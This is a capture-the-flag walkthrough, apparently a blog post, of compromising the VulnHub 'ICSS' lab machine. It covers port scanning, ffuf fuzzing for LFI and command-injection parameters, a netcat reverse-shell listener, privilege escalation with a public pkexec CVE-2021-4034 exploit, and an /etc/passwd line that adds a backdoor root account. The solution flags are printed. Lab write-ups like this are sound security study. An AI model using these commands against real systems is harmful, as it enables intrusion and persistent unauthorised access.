---
title: ICSS CTF
categories: [vulnhub , Walkthrough]
tags: [Fuzzing, LFI, SUIDs]
image:
  path: /Vulnhub-Files/img/ICSS_team_CTF/Untitled.png
  alt:  ICSS Team CTF 🕵️
---
## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Vulnhub/ICSS]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.65     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-19 10:13 IST
Nmap scan report for 10.0.2.65
Host is up (0.0045s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7d:e5:cf:49:3d:e0:45:d7:82:db:5d:5b:41:cd:ba:f3 (RSA)
|   256 4e:45:8e:17:92:7f:c9:4c:7c:43:2b:ef:41:a0:8e:f5 (ECDSA)
|_  256 3d:d0:f6:d4:f4:98:ce:77:36:ff:c5:30:7c:af:c5:3a (ED25519)
25/tcp  open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=ICSSteam
| Not valid before: 2023-02-09T15:14:43
|_Not valid after:  2033-02-06T15:14:43
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: ICSSteam, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ICSS team CTF
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: DARKXPLOITER)
445/tcp open  DDtb        Samba smbd 4.3.11-Ubuntu (workgroup: DARKXPLOITER)
MAC Address: 08:00:27:FA:AB:7B (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  ICSSteam, 1C$$_T34M; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-09-19T04:44:13
|_  start_date: N/A
|_nbstat: NetBIOS name: 1C$$_T34M, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: icssteam
|   NetBIOS computer name: 1C$$_T34M\x00
|   Domain name: \x00
|   FQDN: icssteam
|_  System time: 2023-09-19T10:14:14+05:30

Service detection performed.
```

## Web Enumeartion ⤵️

Lets check port 80 →

![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled.png)

This file indicates LFI as its URL says so lets try it out →

![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled%201.png)

I tried with that parameter as page as it was given I was not able to accss the files so I bruteforced the parameter and I got this →

```bash
┌──(kali㉿kali)-[~/Downloads/Vulnhub/ICSS]
└─$ ffuf -c -mc 200,301,302,401 -fc 404,500,401 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://10.0.2.65/index.php?FUZZ=/etc/passwd' -fs 667 -o ffuf_parameter

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       'v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.65/index.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Output file      : ffuf_parameter
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,401
 :: Filter           : Response size: 667
 :: Filter           : Response status: 404,500,401
________________________________________________

file                    [Status: 200, Size: 2389, Words: 218, Lines: 63, Duration: 4ms]
:: Progress: [4723/4723] :: Job [1/1] :: 127 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Now I also looked for parameter if possible in `wishlist.php` file and I got hit →

```bash
┌──(kali㉿kali)-[~/Downloads/Vulnhub/ICSS]
└─$ ffuf -c -mc 200,301,302,401 -fc 404,500,401 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://10.0.2.65/wishlist.php?FUZZ=' -fs 106 -o ffuf_parameter

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       'v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.65/wishlist.php?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Output file      : ffuf_parameter
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,401
 :: Filter           : Response status: 404,500,401
 :: Filter           : Response size: 106
________________________________________________

par                     [Status: 200, Size: 147, Words: 13, Lines: 11, Duration: 6ms]
:: Progress: [4723/4723] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Now lets access them →

![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled%202.png)

Now I used this path in index.php LFI and I got another information →

![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled%203.png)

Lets try another bruteforce , now for command injection parameter search →

```bash
┌──(kali㉿kali)-[~/Downloads/Vulnhub/ICSS]
└─$ ffuf -c -mc 200,301,302,401 -fc 404,500,401 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://10.0.2.65/index.php?file=ICSSteamshell.php&FUZZ=id' -fs 697 -o ffuf_CI_parameter

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       'v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.65/index.php?file=ICSSteamshell.php&FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Output file      : ffuf_CI_parameter
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,401
 :: Filter           : Response status: 404,500,401
 :: Filter           : Response size: 697
________________________________________________

file                    [Status: 200, Size: 667, Words: 205, Lines: 30, Duration: 1ms]
tweak                   [Status: 200, Size: 804, Words: 209, Lines: 35, Duration: 44ms]
:: Progress: [4723/4723] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Now with tweak I got a hit into the system →

![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled%204.png)

Now lets get a shell now →

![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled%205.png)

In response I got the shell →

```bash
┌──(kali㉿kali)-[~/Downloads/Vulnhub/ICSS]
└─$ nc -lvnp 4444                                     
listening on [any] 4444 ...
connect to [10.0.2.60] from (UNKNOWN) [10.0.2.65] 37532
/bin/sh: 0: cant access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ICSSteam:/var/www/html$ whoami
whoami
www-data
www-data@ICSSteam:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ICSSteam:/var/www/html$
```

Now I checked the SUIDs and I got some data like `psexec` file →

```bash
www-data@ICSSteam:/tmp$ find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/umount
/bin/ping
/bin/su
/bin/fusermount
/bin/ping6
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/home/darkxploiter/check
www-data@ICSSteam:/tmp$
```

I checked its version and it was vulnerable so I exploited it →

```bash
www-data@ICSSteam:/home/darkxploiter$ pkexec --version
pkexec version 0.105
```

I found this exploit → [Exploit](https://github.com/mebeim/CVE-2021-4034)

I followed the steps , transfered all the exploit files into the victim machine and got root →

```bash
www-data@ICSSteam:/tmp$ ./exploit.sh                       
Pwned!
# /bin/bash -i
root@ICSSteam:/tmp# whoami
root
root@ICSSteam:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@ICSSteam:/tmp# cd /root
root@ICSSteam:/root# ls -al
total 44
drwx------  4 root root 4096 Mar  5  2023 .
drwxr-xr-x 25 root root 4096 Feb 20  2023 ..
-rw-------  1 root root 2248 Mar  5  2023 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb  8  2023 .cache
drwxr-xr-x  2 root root 4096 Feb  9  2023 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root  139 Mar  5  2023 root.txt
-rwxr-xr-x  1 root root 8824 Mar  5  2023 solve
root@ICSSteam:/root# cat root.txt
To get the root flag you have execute the solve.

But only after being the actual root of this system otherwise you will not get the flag.
root@ICSSteam:/root# echo "shiv:`openssl passwd root`:0:0:root:/root:/bin/bash" >> /etc/passwd
root@ICSSteam:/root# su shiv
root@ICSSteam:~# ./solve
4996cb979f225ba0581190fbcf3bdf5f  -
root@ICSSteam:~#
```

I also got user.txt file →

```bash
root@ICSSteam:/home/icss# cat user.txt
7e902d2cf294d4909690936388b64cd5  -
root@ICSSteam:/home/icss#
```

Now I can access anything !!